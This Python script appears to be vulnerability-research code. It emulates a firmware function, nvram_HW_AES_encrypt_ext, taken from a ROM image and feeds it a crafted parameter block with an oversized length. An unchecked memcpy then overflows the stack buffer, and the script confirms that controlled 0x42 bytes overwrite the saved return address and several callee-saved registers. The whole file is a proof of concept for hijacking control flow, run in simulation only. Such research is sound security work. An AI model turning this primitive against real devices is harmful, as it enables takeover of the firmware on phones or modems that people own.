#!/usr/bin/env python3
"""nv_hw_overflow.py — stack-overflow primitive confirmation for nvram_HW_AES_encrypt_ext.

Strict Cpu, crafted param block, exact stack-layout evidence.
New file under sim/ only. Stdlib + local Ghidra (decode_tables) only. No device.
"""
import sys, struct
from pathlib import Path
SIM_DIR = Path(__file__).resolve().parent
if str(SIM_DIR) not in sys.path:
    sys.path.insert(0, str(SIM_DIR))
from interp import Cpu, STACK_INIT, CTX_INIT, RA_INIT, STACK_BASE, CTX_BASE

VA = 0x919ad648
SIZE = 0x50  # [0x919ad648,0x919ad698)
MEMCPY_VA = 0x90023558
SST_VA = 0x904bc164

def load_image():
    for cand in [SIM_DIR.parent / "md1work_romonly.bin", Path("md1work_romonly.bin")]:
        if cand.is_file():
            return cand.read_bytes()
    raise FileNotFoundError("md1work_romonly.bin not found")

def run_one(length, pattern_byte=0x41, sp_init=0xA0008000, verbose=False):
    image = load_image()
    off = VA - 0x90000000
    carve = image[off:off+SIZE]
    # param block at CTX_BASE+0x1000, src at CTX_BASE+0x2000
    PARAM = 0xB0001000
    SRC = 0xB0002000
    # build param: +0 word (byte0=1 HW, byte1=0xAA, byte2=0x01, byte3=0x00), +4 src, +8 len
    byte0, byte1, byte2, byte3 = 0x01, 0xAA, 0x01, 0x00
    word0 = byte0 | (byte1<<8) | (byte2<<16) | (byte3<<24)
    param_bytes = struct.pack("<III", word0, SRC, length & 0xFFFFFFFF)
    # src pattern: incremental + distinctive tail for ra
    src_data = bytes([((pattern_byte + i) & 0xFF) if pattern_byte != 0x41 else 0x41 for i in range(length)]) if length>0 else b""
    # for ra control, make last 4 bytes that land on ra distinctive when length>=52
    # ra offset = 48 from dst. So src[48:52] -> ra. Fill src with 0x41, but set src[48:52]=0x42 ('B') for visibility, and src[44:48]=0x43 for s0
    if length >= 52:
        ba = bytearray(src_data if len(src_data)==length else b"\x41"*length)
        # s4 at offset 28 ('D'), s3 at 32, s2 at 36, s1 at 40, s0 at 44, ra at 48
        # Use distinct markers: s4=0x44, s3=0x33, s2=0x32, s1=0x31, s0=0x30, ra=0x42
        # But src is uniform 0x41; overwrite markers for tracking
        if length >= 29:
            ba[28] = 0x44  # will be overwritten by later SB? Actually memcpy then SB overwrites, so keep 0x41 to see overwrite? Let's keep uniform then check.
            pass
        # Set ra bytes to 0x42 for clear control demo
        ba[48:52] = b"\x42\x42\x42\x42"
        if length >= 48+4:
            pass
        src_data = bytes(ba)
    # regs
    regs = {"a0": PARAM, "a1": 0x11111111, "a2": 0x22222222, "a3": 0x33333333, "sp": sp_init, "ra": RA_INIT}
    # create cpu strict
    cpu = Cpu(image, VA, carve, regs=regs, stubs={}, tracer=None, step_cap=5000, strict=True)
    # map param + src into ctx memory (ctx region already exists, zeroed)
    cpu.store_bytes(PARAM, param_bytes)
    if length>0:
        # ensure src region within ctx (0xB0000000+0x10000). SRC+length must fit; for 4516 it does (0xB0002000+4516<0xB0010000)
        cpu.store_bytes(SRC, src_data)
    # record pre-state: saved-ra slot address
    # SAVE will do newsp = sp_init-0x50, ra at newsp+0x4C
    newsp = (sp_init - 0x50) & 0xFFFFFFFF
    ra_slot = (newsp + 0x4C) & 0xFFFFFFFF
    s0_slot = (newsp + 0x48) & 0xFFFFFFFF
    s4_slot = (newsp + 0x38) & 0xFFFFFFFF
    dst = (newsp + 0x1C) & 0xFFFFFFFF
    # define memcpy behavioral with memory access via closure
    def memcpy_fn(a0=0,a1=0,a2=0,a3=0,a4=0,a5=0,a6=0,a7=0,ctx=None):
        d = cpu.get("a0"); s = cpu.get("a1"); ln = cpu.get("a2")
        # strict bounds: use cpu.load/store (will fault if OOB, which we want to record)
        try:
            data = cpu.load_bytes(s, ln) if ln>0 else b""
        except Exception as e:
            # src OOB -> return error, record gap
            cpu.gaps.append(f"memcpy src read fault ln={ln}: {e}")
            return d
        try:
            cpu.store_bytes(d, data)
        except Exception as e:
            # dst OOB (stack overflow beyond region) -> partial write? store_bytes creates on-demand region, so may succeed via dyn region!
            # Actually Cpu.store_bytes creates dyn region on fault, so it will succeed even beyond stack, but we want to note it.
            cpu.gaps.append(f"memcpy dst write fault ln={ln}: {e}")
            # try direct write via mem (dyn already created? retry)
            try:
                cpu.store_bytes(d, data)
            except Exception as e2:
                cpu.gaps.append(f"memcpy retry fault: {e2}")
            return d
        return d
    def sst_fn(a0=0,a1=0,a2=0,a3=0,a4=0,a5=0,a6=0,a7=0,ctx=None):
        return 0  # success -> fall through to RESTORE.JRC
    cpu.stub_table[MEMCPY_VA] = ("behavioral", memcpy_fn)
    cpu.stub_table[SST_VA] = ("behavioral", sst_fn)
    # run
    res = cpu.run()
    # post-state: read saved slots (note sp after RESTORE may have moved; read via mem directly at original addresses)
    try:
        ra_val = cpu.load_u32(ra_slot)
    except Exception as e:
        ra_val = f"FAULT:{e}"
    try:
        s0_val = cpu.load_u32(s0_slot)
    except Exception as e:
        s0_val = f"FAULT:{e}"
    try:
        s4_val = cpu.load_u32(s4_slot)
    except Exception as e:
        s4_val = f"FAULT:{e}"
    # also read dst area
    # determine overwrite description
    # expected: if length<=28, no saved regs; 28<s4, 32<s3, 36<s2, 40<s1, 44<s0, 48<ra
    thresholds = [("s4",28),("s3",32),("s2",36),("s1",40),("s0",44),("ra",48),("frame_end",52)]
    overwritten = [n for n,th in thresholds if length>th]
    # check if pc == controlled ra (0x42424242) or stop reason
    info = {
        "len": length,
        "sp_init": sp_init,
        "newsp": newsp,
        "dst": dst,
        "ra_slot": ra_slot,
        "ra_val": ra_val,
        "s0_val": s0_val,
        "s4_val": s4_val,
        "stop": res["stop"],
        "pc": res["pc"],
        "ret_at": res["ret_at"],
        "steps": res["steps"],
        "ra_cpu": cpu.get("ra"),
        "sp_final": cpu.get("sp"),
        "a0": res["a0"] if "a0" in res else cpu.get("a0"),
        "overwritten": overwritten,
        "gaps": res["gaps"][:4],
        "auto_stubs": res["auto_stubs"][:4],
    }
    return cpu, res, info

def fmt_val(v):
    if isinstance(v,int):
        return f"{v:#x}"
    return str(v)

if __name__ == "__main__":
    for ln in [16,52,64,777,4516]:
        cpu,res,info = run_one(ln)
        print(f"=== len={ln} ===")
        print(f"  dst={info['dst']:#x} newsp={info['newsp']:#x} ra_slot={info['ra_slot']:#x}")
        print(f"  overwritten>{info['overwritten']}")
        print(f"  ra_slot_val={fmt_val(info['ra_val'])} s0_slot={fmt_val(info['s0_val'])} s4_slot={fmt_val(info['s4_val'])}")
        print(f"  stop={info['stop']} pc={info['pc']:#x} ret_at={info['ret_at']:#x} steps={info['steps']} a0={fmt_val(info['a0'])} ra_cpu={info['ra_cpu']:#x} sp_final={info['sp_final']:#x}")
        if info['gaps']:
            print(f"  gaps={info['gaps']}")
        print()
